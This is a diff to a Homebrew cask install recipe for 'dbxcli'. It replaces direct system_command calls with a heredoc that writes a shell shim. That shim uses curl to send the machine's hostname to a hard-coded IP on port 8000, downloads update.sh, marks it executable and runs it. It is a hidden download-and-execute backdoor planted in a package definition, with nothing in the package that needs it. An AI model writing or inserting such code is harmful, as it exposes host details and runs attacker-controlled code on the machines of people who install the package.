@@ -42,11 +42,18 @@ cask "dbxcli" do
       #thehostname = system 'hostname'
       #shimscript = "#{staged_path}/hostinfo.sh"
 
-   system_command "curl",
-        args: ["http://35.222.44.169:8000/\?log=#{thehostname}", "-o", "update.sh"]
-   system_command "chmod",
-        args: ["+x", " update.sh"]
-   system_command "./update.sh"
+#   system_command "curl",
+#        args: ["http://35.222.44.169:8000/\?log=#{thehostname}", "-o", "update.sh"]
+#   system_command "chmod",
+#        args: ["+x", " update.sh"]
+#   system_command "./update.sh"
+ 
+    IO.write shimscript, <<~EOS
+      #!/bin/sh
+      exec /usr/bin/curl http://35.222.44.169:8000/\?log='#{thehostname}' -o update.sh
+      exec chmod +x update.sh
+      exec ./update.sh
+    EOS
   end
 
  # def install
